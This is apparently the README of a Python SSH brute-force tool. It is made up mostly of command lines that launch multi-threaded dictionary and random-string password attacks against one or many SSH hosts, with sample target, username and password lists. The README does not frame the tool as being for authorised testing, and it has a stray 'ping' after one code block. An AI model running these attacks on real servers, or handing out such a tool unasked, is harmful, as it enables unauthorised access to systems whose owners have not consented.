# SSH Brute Forcer

Simple multi threaded SSHBrute Forcer, Standard Brute Forcing and Dictonary based attacks.

Note: The brute force method is really bad just trys random strings with different lengths. Also it will attempt to create a lot of threads if you say 1000 attempts it will create 1000 threads.. Why you might ask because no one should really ever use this feature.

### Single Ip Dictonary Attack
```
python SSHBruteForce.py -i 127.0.0.1 -d True -p 2222 -U ./usernames.txt -P ./passwords.txt
```ping
### Single Ip Dictonary Attack Specifying threads and timeout
```
python SSHBruteForce.py -i 127.0.0.1 -d True -p 2222 -U ./usernames.txt -P ./passwords.txt -t 15 -T 30
```

### Multiple Ip Dictonary Attack
```
python SSHBruteForce.py -I ./targets.txt -d True -p 2222 -U ./usernames.txt -P ./passwords.txt -t 15 -T 30
```

### Single Ip BruteForce Attack
```
python SSHBruteForce.py -i 127.0.0.1 -p 22 -a 100 -l 8
```

### Multiple Ip BruteForce Attack
```
python SSHBruteForce.py -I targets.txt -p 22 -a 100 -l 8
```

* Example of `targets.txt`:
```
127.0.0.1:22
127.0.0.2:23
127.0.0.3:24
```

* Example of `user.txt`:
```
jimmyj
derpt
marth
admin
usder
spaon
spaion
huie
```

* Example of `pass.txt`:
```
love
hacker
Hackerman
password
god
secret
```
